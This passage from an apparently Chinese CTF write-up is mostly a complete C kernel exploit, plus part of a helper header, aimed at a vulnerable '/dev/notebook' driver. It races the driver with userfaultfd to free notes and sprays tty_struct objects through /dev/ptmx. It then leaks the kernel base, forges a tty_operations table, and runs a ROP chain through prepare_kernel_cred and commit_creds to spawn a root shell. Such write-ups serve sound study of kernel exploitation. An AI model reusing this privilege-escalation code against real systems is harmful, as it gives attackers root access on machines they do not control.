class="params">(<span class="type">void</span>* args)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span>* msg)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdd note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    <span class="keyword">if</span>(size &lt;= <span class="number">0x60</span>)</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m&quot;</span>);</span><br><span class="line">        arg.size = <span class="number">0x60</span>;</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">        arg.size = size;</span><br><span class="line">        noteedit(idx, size, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mFetch note information...\n\033[m&quot;</span>);</span><br><span class="line">    notearg arg = &#123;<span class="number">0</span>, <span class="number">0</span>, buf&#125;;</span><br><span class="line">    ioctl(fd, GIFT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mDelete note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, <span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    ioctl(fd, DELETE_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mResize note #%zu to %zu...\n\033[m&quot;</span>, idx, size);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    ioctl(fd, EDIT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mWrite to note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    write(fd, buf, idx);</span><br><span class="line">&#125;</span><br><span class="line">note* <span class="title function_">notebook_msg</span><span class="params">(<span class="type">bool</span> printInfo)</span>&#123;</span><br><span class="line">    note* noteBuf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(note) * <span class="number">0x10</span>);</span><br><span class="line">    notegift(noteBuf);</span><br><span class="line">    <span class="keyword">if</span>(printInfo)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;36m--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Current Notebook Info:\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\tNote #%02d: size = %#zx, pointer = %p\n&quot;</span>, i, noteBuf[i].size, noteBuf[i].note);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n\033[m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> noteBuf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteedit_exp</span><span class="params">(<span class="type">void</span>* args)</span>&#123;</span><br><span class="line">    noteedit((<span class="type">int</span>)args, <span class="number">0x2000</span>, mmap_space);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteadd_exp</span><span class="params">(<span class="type">void</span>* args)</span>&#123;</span><br><span class="line">    noteadd((<span class="type">int</span>)args, <span class="number">0x50</span>, mmap_space);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span>	<span class="comment">// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = (<span class="type">int</span>)uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully entered registered userfaultfd!\n\033[m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">50</span>);      <span class="comment">// stop here</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read((<span class="type">int</span>)uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">        errExit(<span class="string">&quot;Failed to get root privilege&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully get root shell!\n\033[m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    page = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap executed, mmap address: %p\n\033[m&quot;</span>, mmap_space);</span><br><span class="line">    registerUserFaultFd(mmap_space, <span class="number">0x1000</span>, fault_handler_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap space userfaultfd registered.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        noteadd(i, TTY_STRUCT_SIZE, page);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mNotebook filled.\n\033[m&quot;</span>);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;edit_thread, <span class="literal">NULL</span>, noteedit_exp, (<span class="type">void</span>*)i); <span class="comment">// trigger page fault, freeing all notes</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mCreated 16 paused thread of edit and freeing all notes.\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;edit_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;add_thread, <span class="literal">NULL</span>, noteadd_exp, (<span class="type">void</span>*)i);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;add_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ttyinfo[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ttyinfo, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">    <span class="type">char</span>* hit_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> hit_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span>* fake_ttyops_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_ttyops_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">size_t</span>* fake_stack_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_stack_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        read(fd, ttyinfo, i);</span><br><span class="line">        <span class="type">int</span> header = *((<span class="type">int</span>*)ttyinfo);</span><br><span class="line">        <span class="keyword">if</span>(header == <span class="number">0x5401</span> || header ==  <span class="number">0x5402</span>)&#123;</span><br><span class="line">            hit_address = notebook_msg(<span class="literal">false</span>)[i].note;</span><br><span class="line">            hit_idx = i;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_ttyops_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">                fake_ttyops_address = (<span class="type">char</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_ttyops_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                fake_stack_address = (<span class="type">size_t</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_stack_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(hit_address &amp;&amp; fake_stack_address)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(hit_address == <span class="literal">NULL</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to access tty_struct in notes.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fake_stack_address == <span class="literal">NULL</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to find fake stack address.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully accessed tty_struct in note #%d, address: %p\n\033[m&quot;</span>, hit_idx, hit_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully found fake tty_struct_operations in note #%d, address: %p\n\033[m&quot;</span>, fake_ttyops_idx, fake_ttyops_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully found fake stack in note #%d, address: %p\n\033[m&quot;</span>, fake_stack_idx, fake_stack_address);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mReady to get base address of kernel by file_operations ptr.\n\033[m&quot;</span>);</span><br><span class="line">    <span class="type">u_int64_t</span> tty_operation = ((<span class="type">u_int64_t</span>*)ttyinfo)[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mtty_operations address: %p\n\033[m&quot;</span>, (<span class="type">void</span>*)tty_operation);</span><br><span class="line">    <span class="type">u_int64_t</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((tty_operation &amp; <span class="number">0xFFF</span>) == (ptm_unix98_ops &amp; <span class="number">0xFFF</span>))     <span class="comment">// this file_operations is ptm_unix98_ops</span></span><br><span class="line">        offset = tty_operation - ptm_unix98_ops;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((tty_operation &amp; <span class="number">0xFFF</span>) == (pty_unix98_ops &amp; <span class="number">0xFFF</span>))    <span class="comment">// this file_operations is pty_unix98_ops</span></span><br><span class="line">        offset = tty_operation - pty_unix98_ops;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        errExit(<span class="string">&quot;Unexpected tty_operations address.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mBase address got.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">u_int64_t</span> base_address = kernel_BASE + offset;</span><br><span class="line">    <span class="type">void</span> (*commit_creds)() = (<span class="type">void</span>(*)())(commit_creds_BASE + offset);</span><br><span class="line">    <span class="type">void</span> (*prepare_kernel_cred)() = (<span class="type">void</span>(*)())(prepare_kernel_cred_BASE + offset);</span><br><span class="line">    <span class="type">void</span> (*swapgs_restore_regs_and_return_to_usermode)() = (<span class="type">void</span>(*)())(SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mBase address: %zx.\n\033[m&quot;</span>, base_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mOffset: %zx.\n\033[m&quot;</span>, offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mcommit_creds: %p.\n\033[m&quot;</span>, commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mprepare_kernel_cred: %p.\n\033[m&quot;</span>, prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mswapgs_restore_regs_and_return_to_usermode: %p.\n\033[m&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mReady to trigger the first stack pivoting.\n\033[m&quot;</span>);</span><br><span class="line">    noteedit(fake_ttyops_idx, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations), page);</span><br><span class="line">    noteedit(fake_stack_idx, <span class="number">0x100</span>, page);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> original_tty[TTY_STRUCT_SIZE];</span><br><span class="line">    read(fd, original_tty, hit_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mUnchanged tty_struct content:\n\033[m&quot;</span>);</span><br><span class="line">    print_binary(original_tty, TTY_STRUCT_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> fake_tty[TTY_STRUCT_SIZE];</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty, original_tty, TTY_STRUCT_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty_ops[<span class="number">0x200</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_tty_ops, <span class="number">0</span>, <span class="keyword">sizeof</span> fake_tty_ops);</span><br><span class="line">    <span class="type">size_t</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret = <span class="number">0xffffffff81238d50</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> tty_operations*)fake_tty_ops)-&gt;write = (<span class="type">int</span> (*)(<span class="keyword">struct</span> tty_struct *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">int</span>)) (</span><br><span class="line">            push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mfake_tty_operations edited, write pointer: %p\n\033[m&quot;</span>, ((<span class="keyword">struct</span> tty_operations*)fake_tty_ops)-&gt;write);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;35mFirst gadget:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpush rdi;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpop rsp;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpop rbp;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tadd rax, rdx;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tret;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This gadget is used to migrate rsp to tty_struct in note #%d.\n\033[m&quot;</span>, hit_idx);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rbx_pop_rbp_ret = <span class="number">0xffffffff81002141</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rsp_rbp_pop_rbp_ret = <span class="number">0xffffffff8107875c</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">1</span>] = pop_rbx_pop_rbp_ret + offset;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">3</span>] = (<span class="type">size_t</span>) notebook_msg(<span class="literal">false</span>)[fake_ttyops_idx].note;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">4</span>] = mov_rsp_rbp_pop_rbp_ret + offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rbp_ret = <span class="number">0xffffffff81000367</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">1</span>] = pop_rbp_ret + offset;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">2</span>] = (<span class="type">size_t</span>) notebook_msg(<span class="literal">false</span>)[fake_stack_idx].note;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">3</span>] = mov_rsp_rbp_pop_rbp_ret + offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff81045833</span>;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> ropidx = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0xdeadbeefdeadbeef</span>;     <span class="comment">// for pop rbp</span></span><br><span class="line">    rop[ropidx++] = pop_rdi_ret + offset;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)prepare_kernel_cred;    <span class="comment">// prepare_kernel_cred(NULL);</span></span><br><span class="line">    rop[ropidx++] = mov_rdi_rax_pop_rbp_ret + offset;</span><br><span class="line">    rop[ropidx++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)commit_creds;           <span class="comment">// commit_creds(prepare_kernel_cred(NULL));</span></span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)swapgs_restore_regs_and_return_to_usermode + <span class="number">22</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)&amp;getShell;</span><br><span class="line">    rop[ropidx++] = user_cs;</span><br><span class="line">    rop[ropidx++] = user_rflags;</span><br><span class="line">    rop[ropidx++] = user_sp;</span><br><span class="line">    rop[ropidx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, fake_stack_idx);</span><br><span class="line">    write(fd, fake_tty_ops, fake_ttyops_idx);</span><br><span class="line">    write(fd, fake_tty, hit_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mEvil data written, ready to exploit....\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        write(ptmx_fds[i], page, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>uffdexploit.h:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span 